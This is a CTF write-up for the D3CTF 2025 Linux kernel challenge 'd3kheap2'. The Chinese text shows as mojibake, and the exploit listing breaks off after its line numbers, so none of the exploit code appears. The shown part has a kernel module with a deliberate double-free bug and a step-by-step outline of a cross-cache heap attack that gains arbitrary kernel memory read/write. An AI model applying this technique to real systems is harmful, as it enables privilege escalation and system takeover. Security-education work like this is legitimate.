&lt;ãƒ‡ã‚£ãƒ¼ã‚­ãƒ¥ãƒ¼ãƒ–ãƒ»ã‚·ãƒ¼ãƒ†ã‚£ãƒ¼ã‚¨ãƒ• ã‚«ãƒ¼ãƒãƒ« Pwn è£½ä½œå§”å“¡ä¼š&gt;</p><p>Author: arttnba3 @ L-team x El3ctronic x D^3CTF</p><p>You can get the attachment at <a href="https://github.com/arttnba3/D3CTF2025_d3kheap2">https://github.com/arttnba3/D3CTF2025_d3kheap2</a>.</p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>è¿™é“é¢˜ç›®å’Œ 2022 å¹´çš„ <a href="https://github.com/arttnba3/D3CTF2022_d3kheap">d3kheap</a> ä¸€æ ·ä¸éœ€è¦èŠ±å¤ªå¤šç²¾åŠ›è¿›è¡Œé€†å‘ï¼Œé¢˜ç›®ç»™äº†ä¸€ä¸ªå†…æ ¸æ¨¡å— <code>d3kheap2.ko</code> ï¼Œå…¶åªæœ‰ä¸€ä¸ªæœ‰ç”¨çš„æ ¸å¿ƒå‡½æ•° <code>d3kheap2_ioctl()</code> ï¼Œæ ¸å¿ƒåŠŸèƒ½åªæœ‰ä»ç‹¬ç«‹çš„ kmem_cache <code>d3kheap2_cache</code> å½“ä¸­è¿›è¡Œå¯¹è±¡åˆ†é…ï¼Œæ¼æ´ç‚¹åœ¨äºå¯¹å†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°çš„åˆå§‹åŒ–é”™è¯¯å¯¼è‡´èƒ½å¤Ÿå°†ä¸€ä¸ªå¯¹è±¡é‡Šæ”¾ä¸¤æ¬¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">d3kheap2_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file*filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kheap2_ureq</span> <span class="hljs-title">ureq</span>;</span><br>    <span class="hljs-type">long</span> res = <span class="hljs-number">0</span>;<br><br>    spin_lock(&amp;d3kheap2_globl_lock);<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(&amp;ureq, (<span class="hljs-type">void</span>*) arg, <span class="hljs-keyword">sizeof</span>(ureq))) &#123;<br>        logger_error(<span class="hljs-string">&quot;Unable to copy request from userland!\n&quot;</span>);<br>        res = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ureq.idx &gt;= D3KHEAP2_BUF_NR) &#123;<br>        logger_error(<span class="hljs-string">&quot;Got invalid request from userland!\n&quot;</span>);<br>        res = -EINVAL;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>    <span class="hljs-keyword">case</span> D3KHEAP2_OBJ_ALLOC:<br>        <span class="hljs-keyword">if</span> (d3kheap2_bufs[ureq.idx].buffer) &#123;<br>            logger_error(<br>                <span class="hljs-string">&quot;Expected slot [%d] has already been occupied!\n&quot;</span>,<br>                ureq.idx<br>            );<br>            res = -EPERM;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        d3kheap2_bufs[ureq.idx].buffer = kmem_cache_alloc(<br>            d3kheap2_cachep,<br>            GFP_KERNEL | __GFP_ZERO<br>        );<br>        <span class="hljs-keyword">if</span> (!d3kheap2_bufs[ureq.idx].buffer) &#123;<br>            logger_error(<span class="hljs-string">&quot;Failed to alloc new buffer on expected slot!\n&quot;</span>);<br>            res = -ENOMEM;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* vulnerability here */</span><br>        <span class="hljs-type">atomic_set</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">atomic_inc</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count);<br><br>        logger_info(<br>            <span class="hljs-string">&quot;Successfully allocate new buffer for slot [%d].\n&quot;</span>,<br>            ureq.idx<br>        );<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> D3KHEAP2_OBJ_FREE:<br>        <span class="hljs-keyword">if</span> (!d3kheap2_bufs[ureq.idx].buffer) &#123;<br>            logger_error(<br>                <span class="hljs-string">&quot;Expected slot [%d] had not been allocated!\n&quot;</span>,<br>                ureq.idx<br>            );<br>            res = -EPERM;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count) &lt;= <span class="hljs-number">0</span>) &#123;<br>            logger_error(<span class="hljs-string">&quot;You&#x27;re not allowed to free a free slot!&quot;</span>);<br>            res = -EPERM;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-type">atomic_dec</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count);<br>        kmem_cache_free(d3kheap2_cachep, d3kheap2_bufs[ureq.idx].buffer);<br><br>        logger_info(<br>            <span class="hljs-string">&quot;Successfully free existed buffer on slot [%d].\n&quot;</span>,<br>            ureq.idx<br>        );<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> D3KHEAP2_OBJ_EDIT:<br>        logger_error(<br>            <span class="hljs-string">&quot;ğŸ•ŠğŸ•ŠğŸ•Š This function hadn&#x27;t been completed yet bcuz I&#x27;m a pigeon!\n&quot;</span><br>        );<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> D3KHEAP2_OBJ_SHOW:<br>        logger_error(<br>            <span class="hljs-string">&quot;ğŸ•ŠğŸ•ŠğŸ•Š This function hadn&#x27;t been completed yet bcuz I&#x27;m a pigeon!\n&quot;</span><br>        );<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        logger_error(<span class="hljs-string">&quot;Got invalid request from userland!\n&quot;</span>);<br>        res = -EINVAL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>out:<br>    spin_unlock(&amp;d3kheap2_globl_lock);<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€æœ‹å‹ä»¬æˆ–è®¸æ³¨æ„åˆ°äº†ä»Šå¹´è¿™é“é¢˜ä»é¢˜ç›®æ¶æ„è®¾è®¡ä¸Šä¼¼ä¹å’Œ d3kheap é«˜åº¦ç±»ä¼¼ï¼Œå› ä¸ºä»Šå¹´çš„é‡ç‚¹åœ¨äºæ›´å…ˆè¿›çš„ exploitation æŠ€æœ¯ï¼Œå½“å¹´çš„é¢˜ç›®åœ¨äºå¯¹é€šç”¨ <code>kmem_cache</code> ä¸Šçš„ double free çš„åˆ©ç”¨é€šæ³•ï¼Œè€Œä»Šå¹´åˆ™å…³æ³¨äºå¯¹ <strong>ä»»æ„ kmem_cache ä¸Šçš„ double free çš„é«˜æˆåŠŸç‡çš„åˆ©ç”¨é€šæ³•</strong></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>ç”±äºæ¼æ´å¯¹è±¡åœ¨ç‹¬ç«‹çš„ <code>kmem_cache</code> å½“ä¸­ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°åº”å½“ä½¿ç”¨ <code>cross-cache attack</code> ï¼š</p><ul><li>é¦–å…ˆå †å–·åˆ†é…å¤§é‡é¢˜ç›®å¯¹è±¡ï¼Œå†å°†å…¶å…¨éƒ¨é‡Šæ”¾ï¼Œä»è€Œå¡«æ»¡é¢˜ç›®çš„ <code>kmem_cache</code> ä»¥å°†éƒ¨åˆ† SLUB pages é‡Šæ”¾å› buddy system</li><li>åœ¨å¦ä¸€ä¸ª <code>kmem_cache</code> ä¸Šè¿›è¡Œå¤§é‡åˆ†é…å–å›è¿™äº›é¡µé¢ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹© <code>system V IPC</code> ä½œä¸ºç¬¬ä¸€é˜¶æ®µçš„æ¼æ´åˆ©ç”¨å¯¹è±¡</li><li>å°†å‚æ‚¬æŒ‡é’ˆè¿›è¡Œé‡Šæ”¾ä»¥åœ¨ <code>msg_msgseg</code> ä¸Šæ„é€  UAFï¼Œä¹‹åé‡æ–°åˆ†é…è¯¥å¯¹è±¡å›æ¥ä»¥ä½¿å¾—ä¸¤ä¸ª <code>msg_msgseg</code> æŒ‡å‘åŒä¸€ä¸ªå†…æ ¸å¯¹è±¡</li><li>å°†å…¶ä¸­ä¸€ä¸ªé‡Šæ”¾å¹¶é‡æ–°åˆ†é…ä¸º <code>pipe_buffer</code> ï¼Œå› ä¸ºå…¶ GFP flag ä¸ <code>msg_msgseg</code> ç›¸åŒï¼Œéƒ½ä» <code>kmalloc-cg</code> åˆ†é…ï¼ˆå½“ <code>CONFIG_SLAB_BUCKETS</code> æœªå¯ç”¨æ—¶ï¼‰</li><li>é€šè¿‡ <code>msg_msgseg</code> ä¿®æ”¹ <code>pipe_buffer</code> ä»¥åœ¨å†…æ ¸ç©ºé—´è·å–ä»»æ„å†…å­˜è¯»å†™çš„æƒèƒ½</li></ul><p>ä¸‹é¢çš„ä¾¿æ˜¯æˆ‘ä»¬æœ€ç»ˆçš„åˆ©ç”¨ç¨‹åºï¼Œåœ¨è¶…è¿‡ 1024 æ¬¡çš„æœ¬åœ°æµ‹è¯•å½“ä¸­å…¶æœ€ç»ˆçš„åˆ©ç”¨æˆåŠŸç‡çº¦ä¸º <code>99.32%</code> ï¼Œåœ¨ç¬”è€…çœ‹æ¥åº”å½“å·²ç»è¶³å¤Ÿç¨³å®šäº†</p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ‰“è¿œç¨‹çš„æ—¶å€™ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>musl-gcc</code> ç¼–è¯‘æ¥ç¼©å‡äºŒè¿›åˆ¶æ–‡ä»¶çš„å¤§å°ï¼Œæˆ–æ˜¯æ‰‹å†™æ±‡ç¼–ä»£ç  <del>å¦‚æœä½ æ¯”è¾ƒé—²çš„è¯</del></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span 